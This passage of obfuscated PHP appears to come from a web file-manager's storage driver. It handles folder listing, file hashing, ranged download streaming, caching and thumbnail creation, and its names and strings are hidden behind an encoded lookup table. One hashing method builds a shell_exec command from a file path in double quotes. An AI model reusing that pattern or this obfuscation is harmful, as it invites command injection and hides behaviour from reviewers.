($©·Éœ¡ù && $©·Éœ¡ù[$®˜Şâ’ó[33]] == $®˜Şâ’ó[89]) { $¿£ì´ = array($®˜Şâ’ó[90] => 0, $®˜Şâ’ó[91] => 0, $®˜Şâ’ó[92] => 0); $this->infoChildren($Ş„·ŞÚÁ, $¿£ì´); $©·Éœ¡ù[$®˜Şâ’ó[90]] = $¿£ì´[$®˜Şâ’ó[90]]; $©·Éœ¡ù[$®˜Şâ’ó[93]] = array($®˜Şâ’ó[94] => $¿£ì´[$®˜Şâ’ó[91]], $®˜Şâ’ó[95] => $¿£ì´[$®˜Şâ’ó[92]]); $åñÏ†ú¢[$Ş„·ŞÚÁ] = $©·Éœ¡ù; } return $©·Éœ¡ù; } public function listPath($„‘­¥°­, $ëæÎ«¥ = false) { } public function has($›ÁÜªóğ, $ˆÈŠ Ì€ = false, $ëÃáä¢¦ = false) { } public function canRead($Èó‡×) { } public function canWrite($¹ÃŸœ§ç) { } public function getContent($ƒ³ìŒøØ) { } public function setContent($ÄúŒÏÏ, $Í£²û· = '') { } protected function infoChildren($Ì£ûÑÄİ, &$«áğü¾¤) { $Øƒô¿¨Ã =& $_SERVER[Ò°Ì”İ•]; check_abort_echo(); $Îú¦áŒ§ = $this->listPath($Ì£ûÑÄİ, !0); $Îú¦áŒ§ = array_merge($Îú¦áŒ§[$Øƒô¿¨Ã[96]], $Îú¦áŒ§[$Øƒô¿¨Ã[97]]); foreach ($Îú¦áŒ§ as $–ğÁ’Óà) { if ($–ğÁ’Óà[$Øƒô¿¨Ã[33]] == $Øƒô¿¨Ã[89]) { $«áğü¾¤[$Øƒô¿¨Ã[92]]++; $´¾±‘äÕ = $this->getPathInner($–ğÁ’Óà[$Øƒô¿¨Ã[98]]); $this->infoChildren($´¾±‘äÕ, $«áğü¾¤); } else { $«áğü¾¤[$Øƒô¿¨Ã[91]]++; $«áğü¾¤[$Øƒô¿¨Ã[90]] += $–ğÁ’Óà[$Øƒô¿¨Ã[90]]; } } } public function fileSubstr($ü¨±¢ â, $Ü­òòİ, $ù½†¾Ù“) { } public function listAll($ñÌÚÁ¿Ö) { } public function listAllMake($ùÔ´½áë, &$¥Ù¾â†ö) { $Ë¨òëàŠ =& $_SERVER[Ò°Ì”İ•]; check_abort_echo(); $ÈìÍ¼ßÈ = $this->listPath($ùÔ´½áë, !0); if (!$ÈìÍ¼ßÈ) { return; } $‡ùµ¬îº = array_merge($ÈìÍ¼ßÈ[$Ë¨òëàŠ[96]], $ÈìÍ¼ßÈ[$Ë¨òëàŠ[97]]); foreach ($‡ùµ¬îº as $Ø‹Í«¾) { $øÏ®û³à = $Ø‹Í«¾[$Ë¨òëàŠ[33]] == $Ë¨òëàŠ[89]; $—Ì ‰¦õ = array($Ë¨òëàŠ[98] => $Ø‹Í«¾[$Ë¨òëàŠ[98]], $Ë¨òëàŠ[89] => $øÏ®û³à); if (isset($Ø‹Í«¾[$Ë¨òëàŠ[90]])) { $—Ì ‰¦õ[$Ë¨òëàŠ[90]] = $Ø‹Í«¾[$Ë¨òëàŠ[90]]; } if (isset($Ø‹Í«¾[$Ë¨òëàŠ[99]])) { $—Ì ‰¦õ[$Ë¨òëàŠ[99]] = $Ø‹Í«¾[$Ë¨òëàŠ[99]]; } if (!$øÏ®û³à) { $¥Ù¾â†ö[] = $—Ì ‰¦õ; continue; } $¥Ù¾â†ö[] = $—Ì ‰¦õ; $•¯§Íò™ = $Ø‹Í«¾[$Ë¨òëàŠ[98]]; $Ÿ™‹õ›Û = $this->pathDriver; if (substr($Ø‹Í«¾[$Ë¨òëàŠ[98]], 0, strlen($Ÿ™‹õ›Û)) == $Ÿ™‹õ›Û) { $•¯§Íò™ = substr($•¯§Íò™, strlen($Ÿ™‹õ›Û)); } $this->listAllMake($•¯§Íò™, $¥Ù¾â†ö); } } public function listAllSimple($Í‘–»‹, $îÚêÃÅ¯ = false) { $»·›¹‰œ = $this->listAll($Í‘–»‹); return $this->listAllSimpleMake($»·›¹‰œ, $this->getPathOuter($Í‘–»‹), $îÚêÃÅ¯); } public function listAllSimpleMake($ß´öÅ×, $Œº›øÏù, $ˆÖ¥—ƒ) { $ùµ±µå» =& $_SERVER[Ò°Ì”İ•]; $­êÊÍ‚ = array(); $Œº›øÏù = rtrim(get_path_father($Œº›øÏù), $ùµ±µå»[8]) . $ùµ±µå»[8]; foreach ($ß´öÅ× as $Êäã¶îí) { $Ÿ¯²ÛÉ = array($ùµ±µå»[98] => $Êäã¶îí[$ùµ±µå»[98]], $ùµ±µå»[100] => $Êäã¶îí[$ùµ±µå»[98]], $ùµ±µå»[89] => $Êäã¶îí[$ùµ±µå»[89]]); if (isset($Êäã¶îí[$ùµ±µå»[90]]) && !$Êäã¶îí[$ùµ±µå»[89]]) { $Ÿ¯²ÛÉ[$ùµ±µå»[90]] = $Êäã¶îí[$ùµ±µå»[90]]; } if (isset($Êäã¶îí[$ùµ±µå»[99]])) { $Ÿ¯²ÛÉ[$ùµ±µå»[99]] = $Êäã¶îí[$ùµ±µå»[99]]; } if (is_array($Êäã¶îí[$ùµ±µå»[101]])) { $Ÿ¯²ÛÉ[$ùµ±µå»[100]] = $Êäã¶îí[$ùµ±µå»[101]][$ùµ±µå»[98]]; $Ÿ¯²ÛÉ[$ùµ±µå»[90]] = $Êäã¶îí[$ùµ±µå»[101]][$ùµ±µå»[90]]; $Ÿ¯²ÛÉ[$ùµ±µå»[99]] = $Êäã¶îí[$ùµ±µå»[101]][$ùµ±µå»[99]]; } else { if (substr($Êäã¶îí[$ùµ±µå»[98]], 0, strlen($Œº›øÏù)) == $Œº›øÏù) { $Ÿ¯²ÛÉ[$ùµ±µå»[98]] = substr($Êäã¶îí[$ùµ±µå»[98]], strlen($Œº›øÏù)); } } $ñË¤éì½ = $Êäã¶îí[$ùµ±µå»[89]] ? $ùµ±µå»[8] : $ùµ±µå»[12]; $Ÿ¯²ÛÉ[$ùµ±µå»[100]] = rtrim($Ÿ¯²ÛÉ[$ùµ±µå»[100]], $ùµ±µå»[8]) . $ñË¤éì½; $Ÿ¯²ÛÉ[$ùµ±µå»[98]] = $ùµ±µå»[8] . trim($Ÿ¯²ÛÉ[$ùµ±µå»[98]], $ùµ±µå»[8]) . $ñË¤éì½; if (!$ˆÖ¥—ƒ) { $í¾Ÿ¬’ = explode($ùµ±µå»[8], trim($Ÿ¯²ÛÉ[$ùµ±µå»[98]], $ùµ±µå»[8])); $Ÿ¯²ÛÉ[$ùµ±µå»[98]] = $ùµ±µå»[8] . implode($ùµ±µå»[8], array_slice($í¾Ÿ¬’, 1)) . $ñË¤éì½; } $­êÊÍ‚[] = $Ÿ¯²ÛÉ; } return array_sort_by($­êÊÍ‚, $ùµ±µå»[98]); } public function upload($Š€ä¨¾Ÿ, $›è÷É©Ù, $¤–îß â = false, $ºÑÊ±Êµ = REPEAT_REPLACE) { } public function uploadFileByID($˜ªáÖ, $ÏŠ™íÎš, $ ‹°€«Ğ) { } public function uploadFileByPath($ÜÓóç, $À„èú”€, $¦Ë©ÙÀ’ = array()) { } public function isUploadServer() { $…¤¤’¥‚ =& $_SERVER[Ò°Ì”İ•]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $…¤¤’¥‚[102]) { return !0; } return $GLOBALS[$…¤¤’¥‚[6]][$…¤¤’¥‚[103]][$…¤¤’¥‚[104]]; } public function isFileOutServer() { $¢Ì¢À¶È =& $_SERVER[Ò°Ì”İ•]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¢Ì¢À¶È[102]) { return !0; } return $GLOBALS[$¢Ì¢À¶È[6]][$¢Ì¢À¶È[103]][$¢Ì¢À¶È[105]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($µá¶Ã¶Ú) { $æîİ’Ë¦ =& $_SERVER[Ò°Ì”İ•]; if (!$this->isCdnHost()) { return $µá¶Ã¶Ú; } return str_replace(trim(get_url_root($µá¶Ã¶Ú), $æîİ’Ë¦[8]), trim($this->cdnHost, $æîİ’Ë¦[8]), $µá¶Ã¶Ú); } public function uploadLink($ €è™’, $œ„™²¢ = 0) { $úÆ¡ÛÖ› =& $_SERVER[Ò°Ì”İ•]; if ($this->isUploadServer()) { return; } $„±Àò³¬ = $this->getType(); if (!in_array($„±Àò³¬, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ËàÉ ’ = 1024 * 1024 * 10; $€íöºŞÔ = $œ„™²¢ <= $ËàÉ ’ ? $úÆ¡ÛÖ›[106] : $úÆ¡ÛÖ›[107]; $Æº€ = (!$œ„™²¢ ? 1 : ceil($œ„™²¢ / pow(1024, 3))) * 3600 * 4; $ÂÒı¿ºä = $this->{$€íöºŞÔ}($ €è™’, $Æº€); if ($ÂÒı¿ºä) { $ÂÒı¿ºä[$úÆ¡ÛÖ›[108]] = $ €è™’; $ÂÒı¿ºä[$úÆ¡ÛÖ›[109]] = $„±Àò³¬; } return $ÂÒı¿ºä; } public function uploadFormData($îùæß, $µ™çåû = 3600) { } public function uploadMultiData($«ªò ’Ú, $íÜ›®•™ = 3600) { } public function multiUploadFormData($¿å¨“ÎÌ, $€õµˆ‚ê = 3600) { return $this->uploadMultiData($¿å¨“ÎÌ, $€õµˆ‚ê); } public function download($¸‰ÃÜó´, $ƒ½Ù–•‰) { } public function ext($¬ÁÄÖÓÔ) { $¡¦˜‘—Ò =& $_SERVER[Ò°Ì”İ•]; if (strpos($¬ÁÄÖÓÔ, $¡¦˜‘—Ò[8]) === -1) { $ôìä¢ Ã = $¬ÁÄÖÓÔ; } else { $ôìä¢ Ã = $this->pathThis($¬ÁÄÖÓÔ); } $¸í•Ñ¥ò = $¡¦˜‘—Ò[12]; if (strstr($ôìä¢ Ã, $¡¦˜‘—Ò[10])) { $¸í•Ñ¥ò = substr($ôìä¢ Ã, strrpos($ôìä¢ Ã, $¡¦˜‘—Ò[10]) + 1); $¸í•Ñ¥ò = strtolower($¸í•Ñ¥ò); } if (strlen($¸í•Ñ¥ò) > 3 && preg_match($¡¦˜‘—Ò[110], $¸í•Ñ¥ò, $ÈÜƒÀÌÇ)) { $¸í•Ñ¥ò = $¡¦˜‘—Ò[12]; } return $¸í•Ñ¥ò; } public function pathThis($µ©ŸÙÕ™) { $¾ÚÜ‚Ÿ— =& $_SERVER[Ò°Ì”İ•]; $µ©ŸÙÕ™ = str_replace($¾ÚÜ‚Ÿ—[111], $¾ÚÜ‚Ÿ—[8], rtrim($µ©ŸÙÕ™, $¾ÚÜ‚Ÿ—[8])); $†ñ¤“öÕ = strrpos($µ©ŸÙÕ™, $¾ÚÜ‚Ÿ—[8]); if ($†ñ¤“öÕ === !1) { return $µ©ŸÙÕ™; } return substr($µ©ŸÙÕ™, $†ñ¤“öÕ + 1); } public function pathFather($©æ­‰¡ñ) { $ÈğíĞÎ =& $_SERVER[Ò°Ì”İ•]; $©æ­‰¡ñ = str_replace($ÈğíĞÎ[111], $ÈğíĞÎ[8], rtrim($©æ­‰¡ñ, $ÈğíĞÎ[8])); $ó­ñ”« = strrpos($©æ­‰¡ñ, $ÈğíĞÎ[8]); if ($ó­ñ”« === !1) { return $ÈğíĞÎ[12]; } return substr($©æ­‰¡ñ, 0, $ó­ñ”« + 1); } public function hashSimple($†§ŞğÊ­) { $èÅßó×Í =& $_SERVER[Ò°Ì”İ•]; if (!$†§ŞğÊ­) { return md5($èÅßó×Í[12]); } $¦à¯€şŞ = $this->size($†§ŞğÊ­); $¨¯Òğå­ = 200; $Á•Ÿ©®‘ = 50; if ($¦à¯€şŞ <= $¨¯Òğå­ * $Á•Ÿ©®‘) { return $this->hashMd5($†§ŞğÊ­) . $¦à¯€şŞ; } $ûáÈ« = intval($¦à¯€şŞ / $Á•Ÿ©®‘); $¯ÁõÕñš = $èÅßó×Í[12]; for ($´ß§øô = 0; $´ß§øô < $Á•Ÿ©®‘; $´ß§øô++) { $¯ÁõÕñš .= $this->fileSubstr($†§ŞğÊ­, $ûáÈ« * $´ß§øô, $¨¯Òğå­); } $¯ÁõÕñš .= $this->fileSubstr($†§ŞğÊ­, $¦à¯€şŞ - $¨¯Òğå­, $¨¯Òğå­); return md5($¯ÁõÕñš) . $¦à¯€şŞ; } public static $md5Cache = array(); public function hashMd5($”ï£ü¹) { if (!$”ï£ü¹) { return md5($_SERVER[Ò°Ì”İ•][12]); } $”ï£ü¹ = $this->iconvSystem($”ï£ü¹); if (isset(self::$md5Cache[$”ï£ü¹])) { return self::$md5Cache[$”ï£ü¹]; } self::$md5Cache[$”ï£ü¹] = $this->hashMd5Shell($”ï£ü¹); if (!self::$md5Cache[$”ï£ü¹]) { self::$md5Cache[$”ï£ü¹] = @md5_file($”ï£ü¹); } return self::$md5Cache[$”ï£ü¹]; } private function hashMd5Shell($³Ø¾Ãƒ) { $ç€–…É† =& $_SERVER[Ò°Ì”İ•]; if (!$³Ø¾Ãƒ) { return md5($ç€–…É†[12]); } if (!function_exists($ç€–…É†[112])) { return !1; } $ò•—§… = array($ç€–…É†[113], $ç€–…É†[114]); $åË÷ŞÇ® = Cache::get($ç€–…É†[115]); if (!$åË÷ŞÇ®) { $ŸèîéŒ¬ = BASIC_PATH . $ç€–…É†[116]; $Üîˆ÷¨ç = md5_file($ŸèîéŒ¬); $åË÷ŞÇ® = $ç€–…É†[117]; foreach ($ò•—§… as $¶Ã³ÓŞ) { $“·¿ßä³ = shell_exec($¶Ã³ÓŞ . "\40\42{$ŸèîéŒ¬}\42"); if ($“·¿ßä³ && substr(trim($“·¿ßä³), 0, 32) == $Üîˆ÷¨ç) { $åË÷ŞÇ® = $¶Ã³ÓŞ; break; } } Cache::set($ç€–…É†[115], $åË÷ŞÇ®, 3600); } if ($åË÷ŞÇ® == $ç€–…É†[117]) { return !1; } $“·¿ßä³ = shell_exec($åË÷ŞÇ® . "\x20\42{$³Ø¾Ãƒ}\42"); $“·¿ßä³ = str_replace($ç€–…É†[118], $ç€–…É†[12], $“·¿ßä³); return substr($“·¿ßä³, 0, 32); } public function link($ÎïÑë¹ò) { return $ÎïÑë¹ò; } public function fileOut($áŒ´¸‰, $®³…ó´á = false, $ğ¤¤Èôƒ = false, $¾½ä’±½ = '') { $­ã‹Õ‚ =& $_SERVER[Ò°Ì”İ•]; $this->cacheMethod(null, null); if (!$áŒ´¸‰ || !$this->exist($áŒ´¸‰)) { show_json(LNG($­ã‹Õ‚[119]), !1, $ğ¤¤Èôƒ); } $©şà¸øÀ = $this->getType() == $­ã‹Õ‚[120]; $öƒ×Á¼€ = $GLOBALS[$­ã‹Õ‚[6]][$­ã‹Õ‚[103]][$­ã‹Õ‚[121]][$­ã‹Õ‚[122]]; $¬şËÌ†€ = (double) $GLOBALS[$­ã‹Õ‚[6]][$­ã‹Õ‚[103]][$­ã‹Õ‚[121]][$­ã‹Õ‚[123]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $´¯å·Ç = $this->infoFull($áŒ´¸‰); $ÂÎûÅ¤Œ = $´¯å·Ç[$­ã‹Õ‚[90]]; $ï´šÙ‡â = gmdate($­ã‹Õ‚[124], $´¯å·Ç[$­ã‹Õ‚[99]]); $ÂªŠŸ€Ù = $ğ¤¤Èôƒ ? $ğ¤¤Èôƒ : $this->iconvApp($´¯å·Ç[$­ã‹Õ‚[32]]); $Ù–’ëÆ = 0; $™ÈÊÃîŠ = $ÂÎûÅ¤Œ - 1; $‡„£úö­ = $this->ext($ÂªŠŸ€Ù); if (in_array($‡„£úö­, array($­ã‹Õ‚[125], $­ã‹Õ‚[126], $­ã‹Õ‚[127], $­ã‹Õ‚[128]))) { $‡„£úö­ = $­ã‹Õ‚[129]; } if (in_array($‡„£úö­, array($­ã‹Õ‚[130]))) { $‡„£úö­ = $­ã‹Õ‚[131]; } if (!$¾½ä’±½) { $¾½ä’±½ = md5($ï´šÙ‡â . $ÂÎûÅ¤Œ); } $¾½ä’±½ = $­ã‹Õ‚[132] . $¾½ä’±½ . $­ã‹Õ‚[132]; $ñ İ¦ßƒ = get_file_mime($‡„£úö­); $ŒŒ¡èÅ¸ = !0; $ŒŒ¡èÅ¸ = isset($_GET[$­ã‹Õ‚[133]]) ? !1 : !0; if ($®³…ó´á === !1 && !mime_support($ñ İ¦ßƒ)) { $ñ İ¦ßƒ = $­ã‹Õ‚[134]; } header($­ã‹Õ‚[135]); header($­ã‹Õ‚[136] . $ñ İ¦ßƒ); $¡„º¬¯ï = rawurlencode($ÂªŠŸ€Ù); $¡„º¬¯ï = $­ã‹Õ‚[132] . $¡„º¬¯ï . $­ã‹Õ‚[137] . $¡„º¬¯ï; if ($®³…ó´á) { header($­ã‹Õ‚[138]); header($­ã‹Õ‚[139] . $¡„º¬¯ï); } else { if ($ŒŒ¡èÅ¸) { header($­ã‹Õ‚[140] . $¡„º¬¯ï); } } $Œ²®Ü¸Œ = 3600 * 24 * 30; header($­ã‹Õ‚[141]); header($­ã‹Õ‚[142]); header($­ã‹Õ‚[143] . $Œ²®Ü¸Œ); header($­ã‹Õ‚[144] . gmdate($­ã‹Õ‚[124], time() + $Œ²®Ü¸Œ) . $­ã‹Õ‚[145]); if (isset($_SERVER[$­ã‹Õ‚[146]]) && strtotime($_SERVER[$­ã‹Õ‚[146]]) == $´¯å·Ç[$­ã‹Õ‚[99]]) { header($­ã‹Õ‚[147], !0, 304); die; } if (isset($_SERVER[$­ã‹Õ‚[148]]) && $_SERVER[$­ã‹Õ‚[148]] == $¾½ä’±½) { header($­ã‹Õ‚[149] . $¾½ä’±½, !0, 304); die; } header($­ã‹Õ‚[149] . $¾½ä’±½); header($­ã‹Õ‚[150] . $ï´šÙ‡â . $­ã‹Õ‚[145]); header($­ã‹Õ‚[151] . $ÂªŠŸ€Ù); header($­ã‹Õ‚[152]); header($­ã‹Õ‚[153] . $ÂÎûÅ¤Œ); header($­ã‹Õ‚[154]); Hook::trigger($­ã‹Õ‚[155], $áŒ´¸‰, $ÂÎûÅ¤Œ, $ÂªŠŸ€Ù, $‡„£úö­); if (!$®³…ó´á && $‡„£úö­ == $­ã‹Õ‚[156]) { if ($ÂÎûÅ¤Œ > 1024 * 1024 * 5) { die; } $ù½æ÷İ = $this->getContent($áŒ´¸‰); $ù½æ÷İ = Html::clearSVG($ù½æ÷İ); header($­ã‹Õ‚[157] . strlen($ù½æ÷İ)); echo $ù½æ÷İ; die; } $’ßÃ©ªñ = strtolower($_SERVER[$­ã‹Õ‚[158]]); if ($©şà¸øÀ && $’ßÃ©ªñ && $öƒ×Á¼€) { if (strstr($’ßÃ©ªñ, $­ã‹Õ‚[159])) { header($­ã‹Õ‚[160] . $áŒ´¸‰); } else { if (strstr($’ßÃ©ªñ, $­ã‹Õ‚[161])) { header($­ã‹Õ‚[162] . $áŒ´¸‰); } else { if (strstr($’ßÃ©ªñ, $­ã‹Õ‚[163])) { header($­ã‹Õ‚[164] . $áŒ´¸‰); } } } if ($¬şËÌ†€) { header($­ã‹Õ‚[165] . $¬şËÌ†€); } return; } if (isset($_SERVER[$­ã‹Õ‚[166]])) { if (preg_match($­ã‹Õ‚[167], $_SERVER[$­ã‹Õ‚[166]], $–À®ÆÜ)) { $Ù–’ëÆ = intval($–À®ÆÜ[1]); $Ù–’ëÆ = $Ù–’ëÆ <= 0 ? 0 : ($Ù–’ëÆ >= $™ÈÊÃîŠ ? $™ÈÊÃîŠ : $Ù–’ëÆ); if (!empty($–À®ÆÜ[2])) { $åø·È„ó = intval($–À®ÆÜ[2]); $™ÈÊÃîŠ = $åø·È„ó < $Ù–’ëÆ ? $Ù–’ëÆ : ($åø·È„ó >= $™ÈÊÃîŠ ? $™ÈÊÃîŠ : $åø·È„ó); } } header($­ã‹Õ‚[168]); header("\103\157\x6e\164\x65\156\164\x2d\122\141\x6e\147\145\x3a\x20\x62\x79\164\x65\x73\x20{$Ù–’ëÆ}\x2d{$™ÈÊÃîŠ}\x2f" . $ÂÎûÅ¤Œ); } else { header($­ã‹Õ‚[169]); } header($­ã‹Õ‚[170]); header($­ã‹Õ‚[171]); $ÕóÏ§²ƒ = !0; if ($_SERVER[$­ã‹Õ‚[172]] == $­ã‹Õ‚[173] && $ÂÎûÅ¤Œ > 1204 * 1024 * 1024 * 2) { $ÕóÏ§²ƒ = !1; } if ($ÕóÏ§²ƒ) { header($­ã‹Õ‚[174] . ($™ÈÊÃîŠ - $Ù–’ëÆ + 1)); } if ($_SERVER[$­ã‹Õ‚[175]] == $­ã‹Õ‚[176]) { return; } $æ½ÏŞÇ¢ = array($­ã‹Õ‚[177] => !1, $­ã‹Õ‚[178] => $Ù–’ëÆ, $­ã‹Õ‚[179] => $™ÈÊÃîŠ, $­ã‹Õ‚[180] => $‡„£úö­, $­ã‹Õ‚[181] => $´¯å·Ç, $­ã‹Õ‚[182] => $­ã‹Õ‚[12], $­ã‹Õ‚[183] => 0); $æ½ÏŞÇ¢ = Hook::filter($­ã‹Õ‚[184], $æ½ÏŞÇ¢); $ú¬¸ˆ„Ã = 1024 * 300; $°ƒŞ£ô½ = 0; if ($¬şËÌ†€) { $°ƒŞ£ô½ = intval(1000 * 1000 * ($ú¬¸ˆ„Ã / $¬şËÌ†€)); } while ($Ù–’ëÆ <= $™ÈÊÃîŠ) { $³äÈ³åû = timeFloat(); check_abort(); $­İÄ˜¦ = $™ÈÊÃîŠ - $Ù–’ëÆ + 1; if ($­İÄ˜¦ <= $ú¬¸ˆ„Ã) { $ú¬¸ˆ„Ã = $­İÄ˜¦; } $ù½æ÷İ = $this->fileSubstr($áŒ´¸‰, $Ù–’ëÆ, $ú¬¸ˆ„Ã); if ($æ½ÏŞÇ¢[$­ã‹Õ‚[177]]) { $æ½ÏŞÇ¢[$­ã‹Õ‚[182]] = $ù½æ÷İ; $æ½ÏŞÇ¢[$­ã‹Õ‚[183]] = $Ù–’ëÆ; $æ½ÏŞÇ¢ = Hook::filter($­ã‹Õ‚[185], $æ½ÏŞÇ¢); $ù½æ÷İ = $æ½ÏŞÇ¢[$­ã‹Õ‚[182]]; } echo $ù½æ÷İ; $Ù–’ëÆ += $ú¬¸ˆ„Ã; if ($ú¬¸ˆ„Ã == $­İÄ˜¦) { $Ù–’ëÆ = $™ÈÊÃîŠ + 1; } if ($°ƒŞ£ô½) { $ŞÚì© = intval(1000 * 1000 * (timeFloat() - $³äÈ³åû)); $ø‡»Ø½ì = $°ƒŞ£ô½ - $ŞÚì©; if ($ø‡»Ø½ì > 5) { usleep($ø‡»Ø½ì); } } } } public function fileOutServer($ˆ–ƒöÒ, $Ô©„Î¼¹ = false, $Æº÷¬– = false, $¼à‚Ä… = '') { $this->fileOut($ˆ–ƒöÒ, $Ô©„Î¼¹, $Æº÷¬–, $¼à‚Ä…); } public function fileOutLink($ô¡³ÉÖ—) { header($_SERVER[Ò°Ì”İ•][186] . $ô¡³ÉÖ—); die; } public function cacheMethod($İ¢ú¬´, $¸ßı–Ì‘, $Êêã‡Œ = null) { $µ‚‰Ç†Û =& $_SERVER[Ò°Ì”İ•]; static $™¦îİ¨ = array(); $­šäÁ±ï = $¸ßı–Ì‘ ? ltrim($this->getPathOuter($¸ßı–Ì‘), $µ‚‰Ç†Û[8]) : $µ‚‰Ç†Û[12]; $–ƒ¡Šö€ = $µ‚‰Ç†Û[187] . $İ¢ú¬´ . $µ‚‰Ç†Û[188] . rtrim($­šäÁ±ï, $µ‚‰Ç†Û[8]); if (is_null($İ¢ú¬´)) { $™¦îİ¨ = array(); return; } if (is_null($¸ßı–Ì‘)) { foreach ($™¦îİ¨ as $–ƒ¡Šö€ => $°¡õ‚) { if (!strstr($–ƒ¡Šö€, $µ‚‰Ç†Û[187] . $İ¢ú¬´ . $µ‚‰Ç†Û[189])) { continue; } unset($™¦îİ¨[$–ƒ¡Šö€]); } return; } if (!is_null($Êêã‡Œ)) { $™¦îİ¨[$–ƒ¡Šö€] = $Êêã‡Œ; return; } $«İşî  = isset($™¦îİ¨[$–ƒ¡Šö€]) ? $™¦îİ¨[$–ƒ¡Šö€] : null; if (!is_null($«İşî )) { return $«İşî ; } $«İşî  = $this->{$İ¢ú¬´}($¸ßı–Ì‘); $™¦îİ¨[$–ƒ¡Šö€] = $«İşî ; return $«İşî ; } public function cacheMethodInfoSet($ı¾•º°, $í•ÊÑäÔ, $Ì‰›Ã—  = false) { $ëúñÅ· =& $_SERVER[Ò°Ì”İ•]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ëúñÅ·[190], $ı¾•º°, $í•ÊÑäÔ); $this->cacheMethod($ëúñÅ·[191], $ı¾•º°, $í•ÊÑäÔ ? !1 : !0); if (is_array($Ì‰›Ã— )) { $this->cacheMethod($ëúñÅ·[192], $ı¾•º°, $Ì‰›Ã— ); } } public function fileOutImage($¿ †ÁŞ¿, $Ï¯£ò›“ = 250) { $­¬¶ø‘‡ =& $_SERVER[Ò°Ì”İ•]; set_timeout(); if (substr($¿ †ÁŞ¿, 0, 4) == $­¬¶ø‘‡[163]) { $this->fileOutLink($¿ †ÁŞ¿); } $ä´¯¤ä¶ = $this->info($¿ †ÁŞ¿); $Ÿ·Óˆ÷¼ = !1; $ŒŒÃ½¼À = isset($GLOBALS[$­¬¶ø‘‡[193]]) ? $GLOBALS[$­¬¶ø‘‡[193]] : array(); if ($ŒŒÃ½¼À && $ŒŒÃ½¼À[$­¬¶ø‘‡[194]] == $ä´¯¤ä¶[$­¬¶ø‘‡[98]]) { $ä´¯¤ä¶ = $ŒŒÃ½¼À; $êß¿Àó = $ä´¯¤ä¶[$­¬¶ø‘‡[195]]; if ($êß¿Àó && isset($êß¿Àó[$­¬¶ø‘‡[196]])) { if ($êß¿Àó[$­¬¶ø‘‡[196]] <= $Ï¯£ò›“ && $êß¿Àó[$­¬¶ø‘‡[197]] <= $Ï¯£ò›“) { $Ÿ·Óˆ÷¼ = !0; } } } if ($ä´¯¤ä¶[$­¬¶ø‘‡[90]] <= 1024 * 50 || $Ÿ·Óˆ÷¼ || !function_exists($­¬¶ø‘‡[198]) || $ä´¯¤ä¶[$­¬¶ø‘‡[180]] == $­¬¶ø‘‡[199]) { return $this->fileOut($¿ †ÁŞ¿, !1, $ä´¯¤ä¶[$­¬¶ø‘‡[32]]); } $ÓÙúâ—³ = kodIO::hashPath($ä´¯¤ä¶); $Öüœ‰Ÿê = "\x63\x6f\x76\x65\162\137{$ÓÙúâ—³}\137{$Ï¯£ò›“}\56\160\x6e\x67"; $–şº»„ = IO_PATH_SYSTEM_TEMP . $­¬¶ø‘‡[200]; $îÎ¢Õ— = IO::infoFullSimple($–şº»„); $Áçúä¦ = $îÎ¢Õ— && is_array($îÎ¢Õ—) ? $îÎ¢Õ—[$­¬¶ø‘‡[98]] : $­¬¶ø‘‡[12]; if (!$Áçúä¦) { $Áçúä¦ = IO::mkdir($–şº»„); } if ($ä´¯¤ä¶[$­¬¶ø‘‡[201]] == $­¬¶ø‘‡[202] && isset($ä´¯¤ä¶[$­¬¶ø‘‡[203]]) && $ä´¯¤ä¶[$­¬¶ø‘‡[203]] == kodIO::sourceID($Áçúä¦)) { $®¤»•ÉÃ = $ä´¯¤ä¶[$­¬¶ø‘‡[204]]; if ($Ï¯£ò›“ <= 500) { $¥Àô‹ãş = preg_replace($­¬¶ø‘‡[205], $­¬¶ø‘‡[206], $ä´¯¤ä¶[$­¬¶ø‘‡[32]]); $®¤»•ÉÃ = IO::fileNameExist($Áçúä¦, $¥Àô‹ãş); } return IO::fileOut(KodIO::make($®¤»•ÉÃ), !1, $ä´¯¤ä¶[$­¬¶ø‘‡[32]]); } $’°‚¢£ª = IO::fileNameExist($Áçúä¦, $Öüœ‰Ÿê); if ($’°‚¢£ª) { return IO::fileOut(KodIO::make($’°‚¢£ª), !1, $ä´¯¤ä¶[$­¬¶ø‘‡[32]]); } if ($Ï¯£ò›“ > 1000) { $this->makeImageCover($Áçúä¦, $¿ †ÁŞ¿, $Öüœ‰Ÿê, $Ï¯£ò›“); $this->makeImageCover($Áçúä¦, $¿ †ÁŞ¿, "\143\157\x76\145\162\137{$ÓÙúâ—³}\137\62\x35\x30\56\x70\x6e\147", 250); $’°‚¢£ª = IO::fileNameExist($Áçúä¦, $Öüœ‰Ÿê); if ($’°‚¢£ª) { return IO::fileOut(KodIO::make($’°‚¢£ª), !1, $ä´¯¤ä¶[$­¬¶ø‘‡[32]]); } die; } if (!kodIO::allowCover($ä´¯¤ä¶)) { return $this->fileOut($¿ †ÁŞ¿, !1, $ä´¯¤ä¶[$­¬¶ø‘‡[32]]); } $¢§õş– = Cache::get($Öüœ‰Ÿê); if ($¢§õş– == $­¬¶ø‘‡[207] || $¢§õş– == $­¬¶ø‘‡[208]) { echo $¢§õş–; die; } Cache::set($Öüœ‰Ÿê, $­¬¶ø‘‡[208], 60); $ŠîÊÕ´ú = array($Áçúä¦, $ä´¯¤ä¶[$­¬¶ø‘‡[98]], $Öüœ‰Ÿê, $Ï¯£ò›“); $†¤¶ş²¢ = $­¬¶ø‘‡[209] . $ä´¯¤ä¶[$­¬¶ø‘‡[90]] . $­¬¶ø‘‡[210] . $Öüœ‰Ÿê . $­¬¶ø‘‡[211] . $ä´¯¤ä¶[$­¬¶ø‘‡[32]] . $­¬¶ø‘‡[212] . $ä´¯¤ä¶[$­¬¶ø‘‡[98]]; TaskQueue::add($­¬¶ø‘‡[213], $ŠîÊÕ´ú, $†¤¶ş²¢, $Öüœ‰Ÿê); } public function makeImageCover($ö¿ƒ€™—, $ÛÄÂ÷ğ, $ÜùàÄµÙ, $¬ä®—Å‰) { $½©ÙÖ¸ =& $_SERVER[Ò°Ì”İ•]; if (IO::fileNameExist($ö¿ƒ€™—, $ÜùàÄµÙ)) { return $½©ÙÖ¸[214]; } if (!is_dir(DATA_THUMB)) { 